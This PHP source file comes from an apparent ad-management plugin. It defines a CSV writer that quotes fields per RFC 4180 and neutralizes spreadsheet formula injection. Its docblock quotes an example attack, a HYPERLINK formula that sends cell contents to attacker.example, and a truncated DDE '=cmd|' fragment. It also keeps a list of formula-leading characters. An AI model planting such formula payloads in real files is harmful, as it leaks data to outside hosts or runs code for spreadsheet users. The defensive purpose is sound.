<?php
/**
 * RFC 4180 CSV serialization, with spreadsheet formulas neutralized.
 *
 * @package Aggressive\Ads
 */

declare(strict_types=1);

namespace Aggressive\Ads\Domain;

/**
 * Turning rows into a CSV document, with no WordPress dependency.
 *
 * The escaping here is doing two different jobs, and conflating them is how
 * CSV export becomes a vulnerability.
 *
 * The first is RFC 4180 quoting, which decides whether the *file* parses. The
 * second is formula neutralization, which decides whether opening the file is
 * safe — and it is not a parsing concern at all.
 *
 * Spreadsheet importers can interpret formula leaders and leading control
 * characters as executable content. A campaign
 * named `=HYPERLINK("https://attacker.example/"&A1,"Click")` is a legal
 * campaign name that this plugin will accept, store, escape correctly for HTML,
 * and then hand to a reviewer's spreadsheet as executable content. Correct
 * quoting does not help: `"=cmd|..."` is a well-formed quoted field, and Excel
 * still evaluates it.
 *
 * So every field is prefixed before it is quoted. See docs/threat-model.md.
 */
final class Csv_Writer {

	/**
	 * Leading characters a spreadsheet reads as the start of a formula.
	 *
	 * Include line feed and full-width variants recognized by some locales.
	 */
	private const FORMULA_LEADERS = array( '=', '+', '-', '@', "\t", "\r", "\n", '＝', '＋', '－', '＠' );

	/**
	 * A byte order mark, so Excel reads the file as UTF-8.
	 *
	 * Without it, Excel on Windows guesses the ANSI code page, and an
	 * advertiser whose organization name is not ASCII gets mojibake in the one
	 * artefact they are most likely to forward to somebody else.
	 */
	public const BOM = "\xEF\xBB\xBF";

	/**
	 * Serializes one row, CRLF-terminated.
	 *
	 * @param array<int, string|int|float|null> $fields Ordered cells.
	 */
	public static function row( array $fields ): string {
		$cells = array();

		foreach ( $fields as $field ) {
			$cells[] = self::cell( $field );
		}

		// CRLF, not "\n": RFC 4180 specifies it, and Excel needs it to keep
		// rows separate on import.
		return implode( ',', $cells ) . "\r\n";
	}

	/**
	 * Serializes a whole document, header first.
	 *
	 * @param array<int, string>                            $header Column labels.
	 * @param array<int, array<int, string|int|float|null>> $rows   Data rows.
	 */
	public static function document( array $header, array $rows ): string {
		$out = self::BOM . self::row( $header );

		foreach ( $rows as $row ) {
			$out .= self::row( $row );
		}

		return $out;
	}

	/**
	 * Build before sending: null means the complete document exceeds its budget.
	 * Limits include BOM, header, quoting, and CRLF bytes; the header is not a data row.
	 *
	 * @param array<int, string>                          $header    Column labels.
	 * @param iterable<array<int, string|int|float|null>> $rows      Data rows.
	 * @param int                                         $max_rows  Data-row limit.
	 * @param int                                         $max_bytes Serialized byte limit.
	 */
	public static function bounded_document( array $header, iterable $rows, int $max_rows, int $max_bytes ): ?string {
		$out = self::BOM . self::row( $header );
		if ( $max_rows < 0 || strlen( $out ) > $max_bytes ) {
			return null;
		}
		$count = 0;
		foreach ( $rows as $fields ) {
			if ( ++$count > $max_rows ) {
				return null;
			}
			$row = self::row( $fields );
			if ( strlen( $row ) > $max_bytes - strlen( $out ) ) {
				return null;
			}
			$out .= $row;
		}

		return $out;
	}

	/**
	 * Neutralizes, then quotes, one field.
	 *
	 * @param string|int|float|null $field Raw value.
	 */
	private static function cell( string|int|float|null $field ): string {
		if ( null === $field ) {
			return '';
		}

		if ( is_int( $field ) || is_float( $field ) ) {
			return (string) $field;
		}

		$value = self::neutralize( $field );

		// Quote whenever a delimiter, quote or newline would otherwise break
		// the row — and, once neutralized, whenever the leading apostrophe was
		// added, so the guard cannot be stripped by a lenient parser.
		if ( $value !== $field || 1 === preg_match( '/[",\r\n]/', $value ) ) {
			return '"' . str_replace( '"', '""', $value ) . '"';
		}

		return $value;
	}

	/**
	 * Prefixes a formula-leading value so a spreadsheet treats it as text.
	 *
	 * Preserve the original text behind an apostrophe on the initial import.
	 * Spreadsheet save/re-import behavior varies; CSV cannot enforce text types
	 * across subsequent editing in every spreadsheet application.
	 *
	 * @param string $value Raw field.
	 */
	private static function neutralize( string $value ): string {
		if ( '' === $value ) {
			return $value;
		}

		foreach ( self::FORMULA_LEADERS as $leader ) {
			if ( str_starts_with( $value, $leader ) ) {
				return "'" . $value;
			}
		}

		return $value;
	}
}
